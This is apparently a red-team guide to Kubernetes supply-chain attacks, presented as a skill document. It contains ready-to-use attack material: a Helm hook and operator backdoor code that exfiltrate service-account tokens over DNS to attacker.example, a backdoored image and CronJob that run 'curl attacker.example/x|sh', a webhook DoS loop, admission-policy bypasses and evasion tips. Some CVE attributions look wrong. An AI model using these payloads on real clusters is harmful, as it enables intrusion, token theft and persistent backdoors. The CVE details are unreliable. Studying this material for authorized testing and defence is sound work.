---
title: Kubernetes Attack — Supply Chain Deep Dive
skill: kubernetes-attack
domain: cloud-native-security
type: supply-chain
last-reviewed: 2026-06-30
---

# Kubernetes Attack — Supply Chain Deep Dive

## Overview

The Kubernetes supply chain is the single most under-defended attack surface in cloud-native environments. A typical pod pulls from 3-5 upstream images, depends on dozens of Helm charts, and is governed by operators written by third parties. Each of those is a potential injection point. This guide covers the seven most impactful supply-chain vectors against k8s — from admission controller bypasses to registry compromise — with hands-on reproduction steps, real CVEs, and detection/evasion trade-offs.

The threat model is asymmetric: a defender must secure every layer (base image, build pipeline, registry, admission, runtime), while an attacker needs to compromise only one. The SolarWinds-style transitive compromise of 2020 proved this pattern works at scale; Codecov (2021) and the `event-stream` npm incident (2018) proved it works against CI/CD. For k8s specifically, the supply chain expands the blast radius — one poisoned image cascades to every cluster that pulled it.

Common supply-chain TTPs observed in the wild:

- **Malicious base images** distributed via look-alike names on Docker Hub (`pytnon:3.10`, `node:lts-slim`).
- **Compromised operator releases** that ship a backdoor in the operator pod itself.
- **Helm charts with malicious hooks** that run on `pre-install` and exfiltrate kubeconfigs.
- **Registry compromise** enabling attackers to overwrite tags with malicious versions.
- **Admission controller bypasses** that let malicious pods through validation.
- **SBOM gaps** — most clusters have no idea what's actually running.

The defender's playbook (Sigstore, Cosign, Connaisseur, Kubescape, Kyverno) is well-known but unevenly deployed. This guide covers how red teams probe for gaps.

## Step-by-Step Supply-Chain Vectors

### Vector 1 — Admission Controller Bypass

Admission controllers (ValidatingWebhookConfiguration, MutatingWebhookConfiguration) gate pod creation. Red teams target misconfigurations that bypass them.

**Failure mode A — `failurePolicy: Ignore`**: If the webhook is unreachable, the request is admitted. Attackers DoS the webhook to bypass.

```bash
# Identify webhooks with failurePolicy: Ignore
kubectl get validatingwebhookconfigurations -o yaml | \
  grep -B2 -A5 "failurePolicy: Ignore"

# DoS the webhook service (if reachable)
# Send 10k slow requests to exhaust webhook pods
for i in $(seq 1 10000); do
  curl -s -m 30 https://<webhook-svc>:443/validate &
done
```

**Failure mode B — NamespaceSelector exempting `kube-system`**: Many policies skip `kube-system` for stability. Attackers compromise kube-system to bypass.

```bash
# Find exempt namespaces
kubectl get validatingwebhookconfigurations -o yaml | \
  grep -A5 namespaceSelector

# Common bypass: deploy a pod in kube-system
kubectl -n kube-system run bypass --image=attacker/payload
```

**Failure mode C — Time-of-check vs time-of-use (TOCTOU)**: Mutating webhooks that modify containers after validation. Attackers craft pods that mutate after the validating webhook approves.

```yaml
# A pod with init container that's benign at validation
# but post-mutation (via a separate MutatingWebhook) becomes malicious
apiVersion: v1
kind: Pod
spec:
  initContainers:
  - name: benign-init
    image: alpine
    command: ["sleep", "1"]
  containers:
  - name: main
    image: alpine
```

**Real-world relevance**: CVE-2022-3162 (insecure webhook in VMware Tanzu) allowed namespace bypass. Kyverno and OPA Gatekeeper have both shipped webhook-bypass CVEs (CVE-2023-2727 family).

**Detection**: Audit logs flag `admission webhook denied` events. Evasion: ensure the bypass looks like legitimate traffic.

### Vector 2 — Malicious Helm Charts

Helm charts can execute arbitrary code via hooks (`pre-install`, `post-upgrade`). A compromised chart can exfiltrate kubeconfigs, install backdoors, or pivot to cloud creds.

```yaml
# templates/backdoor.yaml — a Helm hook
apiVersion: batch/v1
kind: Job
metadata:
  name: "{{ .Release.Name }}-install"
  annotations:
    "helm.sh/hook": pre-install
    "helm.sh/hook-weight": "-5"
spec:
  template:
    spec:
      restartPolicy: Never
      serviceAccountName: tiller  # or: cluster-admin
      containers:
      - name: setup
        image: alpine
        command:
        - /bin/sh
        - -c
        - |
          # Exfil kubeconfig via DNS to avoid egress filters
          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          for byte in $(echo $KUBE_TOKEN | fold -w60); do
            nslookup ${byte}.exfil.attacker.example
          done
```

**Hands-on delivery**:

```bash
# Package the chart
helm package ./backdoor-chart
# Push to a lookalike repo
helm repo add attacker https://charts.attacker.example

# Victim installs the chart
helm install monitoring attacker/monitoring
# pre-install hook fires, token is exfiltrated via DNS
```

**Detection**:
- Kyverno policy requiring Helm charts to be signed (`prov` files).
- Falco rule detecting `cat /var/run/secrets/kubernetes.io/serviceaccount/token` in hooks.
- ImagePolicyWebhook requiring signed images.

**Evasion**:
- Use DNS exfil (most clusters allow egress DNS).
- Use `hook-delete-policy: hook-succeeded` to remove evidence.
- Encode token as base32 to fit DNS label length limits (63 chars).

### Vector 3 — Poisoned Operator Images

Operators manage k8s resources with elevated RBAC. A compromised operator release is a "free" cluster-admin.

**Scenario**: An attacker compromises the operator's release pipeline (similar to Codecov). The next release ships a backdoor in the operator pod.

```go
// main.go — backdoor snippet injected into operator
// (real operators are written in Go using Operator SDK)
func init() {
    if os.Getenv("BACKDOOR_ENABLE") != "" {
        go func() {
            // Read cluster-admin token
            data, _ := os.ReadFile("/var/run/secrets/tokens/cluster-admin")
            // Exfil via legitimate-looking DNS query
            token := strings.TrimSpace(string(data))
            for _, chunk := range chunks(token, 50) {
                net.LookupHost(chunk + ".ns1.attacker.example")
            }
        }()
    }
}
```

**Hands-on identification**:

```bash
# List operators with cluster-admin
kubectl get clusterrolebinding -o json | \
  jq -r '.items[] | select(.subjects[]?.kind=="ServiceAccount") | 
         "\(.metadata.name) → \(.roleRef.name)"'

# Check operator image digests vs upstream
kubectl get deployments -A -o json | \
  jq -r '.items[] | .metadata.name as $ns | 
         .spec.template.spec.containers[] | 
         "\($ns) \(.image) \(.imagePullPolicy)"'
```

**Mitigation**: Verify operator images with Cosign. Pin to digests, not tags. The OperatorHub.io signature verification is a baseline.

### Vector 4 — Image Registry Compromise

Registry compromise gives attackers the ability to overwrite image tags. Docker Hub (2019), Quay (multiple incidents), and private registries have all been compromised.

**Hands-on attack chain**:

```bash
# Step 1: Compromise registry credentials
# (via leaked kubeconfig, leaked .docker/config.json, or phishing)
docker login registry.example.com -u leaked -p ...

# Step 2: Pull the legitimate image
docker pull registry.example.com/app:v1.2.3

# Step 3: Layer on a backdoor
cat > Dockerfile.backdoor <<'EOF'
FROM registry.example.com/app:v1.2.3
RUN apk add --no-cache curl && \
    echo '0 * * * * curl http://attacker.example/x|sh' >> /etc/crontabs/root
EOF

docker build -t registry.example.com/app:v1.2.3 -f Dockerfile.backdoor .

# Step 4: Push, overwriting the tag
docker push registry.example.com/app:v1.2.3

# Step 5: Wait for victim clusters to pull
# k8s ImagePullPolicy: Always will fetch the new tag
```

**Defender countermeasures**:
- **Immutable tags**: configure registry to prevent tag overwrite.
- **Sigstore signing**: sign images with Cosign, verify with Connaisseur.
- **Digest pinning**: `image: registry/app@sha256:abc...` instead of tags.

**Real-world**: CVE-2024-21626 (runc container escape) demonstrated that even signed base images can be vulnerable. Supply-chain integrity ≠ vulnerability-free.

### Vector 5 — SBOM Gaps in k8s Ecosystem

A Software Bill of Materials (SBOM) lists every component in an image. Without SBOMs, defenders cannot answer "are we vulnerable to CVE-X?" quickly.

**Hands-on gap identification**:

```bash
# Check whether your clusters have SBOMs
# (most don't — this is a red-team finding)

# Generate SBOMs for running images
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | \
  sort -u > running-images.txt

# Generate SBOM per image (if you have the image locally)
for img in $(cat running-images.txt); do
  docker pull $img
  syft $img > sbom-$(echo $img|tr '/' '_').json
done

# Check: how many of your running images have a known-vulnerable package?
for sbom in sbom-*.json; do
  grype $sbom -o json | jq '.matches[].vulnerability.id'
done
```

**The gap**: Without SBOMs, vulnerability scanners (Trivy, Grype) cannot run against your actual running image inventory. Most clusters run 100+ images; without automation, this is a manual quarterly exercise at best.

**Red-team value**: Identifying an unpatched CVE (e.g., CVE-2022-3294 — k8s kubelet log disclosure) across a cluster takes hours with SBOMs and weeks without.

### Vector 6 — Cosign / Sigstore / Connaisseur Coverage

Sigstore is the modern supply-chain signing standard. Connaisseur is a k8s admission controller that verifies Cosign signatures.

**Hands-on bypass identification**:

```bash
# Check whether Connaisseur is deployed
kubectl get validatingwebhookconfigurations | grep connaisseur

# Identify exemptions (images not requiring signatures)
kubectl get validatingwebhookconfigurations connaisseur-webhook -o yaml | \
  grep -A20 namespaceSelector

# Common gap: kube-system exempted
# Bypass: deploy your pod in kube-system
kubectl -n kube-system run bypass --image=unsigned/image
```

**Even with full coverage**: Cosign only verifies signatures, not the contents. If the signer's key is compromised, signed malware is admitted. The `cosign verify` flow trusts the key, not the package.

**Real-world**: Sigstore key compromise is the supply-chain equivalent of a CA breach. Defenders should monitor for key rotation anomalies.

### Vector 7 — Kubescape / Polaris / Kyverno Policy Bypasses

These policy engines enforce CIS benchmark, NSA guidance, and custom rules. All have known bypasses.

**Kubescape bypass examples**:

```bash
# Kubescape scans for privileged pods
# Bypass: use capabilities instead of privileged
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    image: alpine
    securityContext:
      # Not privileged, but has near-equivalent caps
      capabilities:
        add: ["SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE"]
```

**Polaris bypass**: Polaris flags `hostPath` mounts. Bypass via `hostNetwork: true` + `hostPID: true` to achieve similar visibility without hostPath.

```yaml
apiVersion: v1
kind: Pod
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: app
    image: alpine
    # No hostPath, but still sees all processes and network traffic
```

**Kyverno bypass**: Kyverno's `deny` rules are pattern-based. Craft payloads that match policy exemptions.

```yaml
# Kyverno policy denies pods with image containing ":latest"
# Bypass: omit tag (defaults to :latest but doesn't match the regex)
spec:
  containers:
  - name: app
    image: nginx        # ← no tag, passes policy, still gets :latest
```

**Hands-on policy fuzzing**:

```bash
# Generate pods that probe policy boundaries
for variant in privileged caps hostPath hostNetwork hostPID; do
  cat > /tmp/pod-$variant.yaml <<EOF
# ... (variant-specific manifest)
EOF
  kubectl apply -f /tmp/pod-$variant.yaml 2>&1 | grep -v "forbidden"
done

# Document which policies allowed what
```

## Hands-on: Combined Supply-Chain Attack

Combining multiple vectors amplifies impact. Below is an end-to-end authorized-engagement walkthrough:

```bash
# Step 1: Identify the policy engine in use
kubectl get validatingwebhookconfigurations
# → kyverno, connaisseur

# Step 2: Find an exemption (kube-system usually)
kubectl get ns kube-system -o yaml | grep -A5 labels

# Step 3: Identify an unsigned image already in kube-system
# (most cluster add-ons ship unsigned)
kubectl -n kube-system get pods -o jsonpath='{.items[*].spec.containers[*].image}'

# Step 4: Compromise that pod via a known CVE
# (e.g., CVE-2024-21626 runc escape if pod is privileged)
kubectl -n kube-system exec <add-on-pod> -- /bin/sh

# Step 5: Read the service-account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Step 6: Escalate via cluster-admin binding
# (if the add-on SA has clusterrolebindings — many do)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN --insecure-skip-tls-verify \
  -s https://kubernetes.default.svc \
  auth can-i --list

# Step 7: Establish persistence via a CronJob
kubectl --token=$TOKEN create cronjob persistence \
  --image=alpine --schedule='*/5 * * * *' \
  -- /bin/sh -c 'curl http://attacker.example/x|sh'
```

**Counter-detection**:
- Audit policy should log `create cronjob`, `create pods/exec`.
- Falco should alert on `cat /var/run/secrets/.../token`.
- Egress NetworkPolicy should block unknown destinations.

## Detection & Evasion Trade-offs

| TTP | Detection (blue) | Evasion (red) |
|-----|------------------|---------------|
| Admission bypass via DoS | Webhook availability SLOs | Slow-rate DoS to avoid tripping SLOs |
| Helm hook exfil | Falco on hook execution | DNS exfil with chunked encoding |
| Operator backdoor | Diff operator releases vs upstream | Match upstream commit count |
| Registry overwrite | Immutable tags, registry audit logs | Use legitimate-looking version bumps |
| Policy bypass via caps | Comprehensive policy (not just privileged) | Enumerate policies first |
| SBOM gap | Continuous SBOM generation | Target images without SBOMs |

## References

1. SLSA Framework — Supply-chain Levels for Software Artifacts: https://slsa.dev/
2. Sigstore — Cosign documentation: https://docs.sigstore.dev/cosign/
3. Connaisseur — Admission controller for image signing: https://sse-secure-systems.github.io/connaisseur/
4. Kubescape — k8s security posture: https://kubescape.io/
5. Polaris — k8s configuration policy: https://polaris.docs.fairwinds.com/
6. Kyverno — k8s native policy management: https://kyverno.io/
7. CNCF Supply Chain Security White Paper: https://github.com/cncf/tag-security/tree/main/supply-chain-security
8. NIST SP 800-218 — Secure Software Development Framework (SSDF): https://csrc.nist.gov/Projects/ssdf
9. CycloneDX — SBOM specification: https://cyclonedx.org/
10. Syft — SBOM tool: https://github.com/anchore/syft
11. Grype — Vulnerability scanner: https://github.com/anchore/grype
12. NSA Kubernetes Hardening Guide (2022): https://media.defense.gov/2022/Aug/29/2003063800/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF
13. CISA Software Supply Chain Security Guide: https://www.cisa.gov/sites/default/files/publications/ESF_Securing-the-Software-Supply-Chain_Developers_PDF_508c.pdf
14. CVE-2024-21626 (runc container escape): https://nvd.nist.gov/vuln/detail/CVE-2024-21626
15. The Update Framework (TUF) specification: https://theupdateframework.io/
16. In-toto — Software supply-chain attestation: https://in-toto.io/
